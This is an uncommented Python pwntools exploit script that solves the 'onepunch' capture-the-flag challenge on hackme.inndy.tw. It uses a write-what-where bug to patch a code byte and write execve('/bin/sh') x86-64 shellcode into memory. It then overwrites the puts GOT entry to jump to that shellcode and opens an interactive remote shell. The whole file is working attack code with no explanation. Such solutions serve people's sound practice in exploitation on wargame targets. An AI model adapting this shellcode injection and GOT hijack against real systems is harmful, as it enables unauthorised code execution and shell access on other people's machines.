#!/usr/bin/python

from pwn import *
sc64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x31\xf6\xb0\x3b\x0f\x05"
puts_got = 0x601018

def write(desti, value):
    s.recvuntil('Where What?')
    s.sendline(hex(desti) + ' ' + str(value))

config = '''
b *0x400769
b *0x400741
'''

context.log_level = 'debug'
s = remote('hackme.inndy.tw', 7718)
#s = process('./onepunch')
#gdb.attach(s, config)

write(0x400768, 0x91)
addr_sc = 0x400000
for x in sc64:
    write(addr_sc, ord(x))
    addr_sc += 1
i = 0
for x in "\x00\x00\x40\x00\x00\x00\x00\x00":
    write(puts_got+i, ord(x))
    i += 1

write(0x400070, 0xff)

s.interactive()
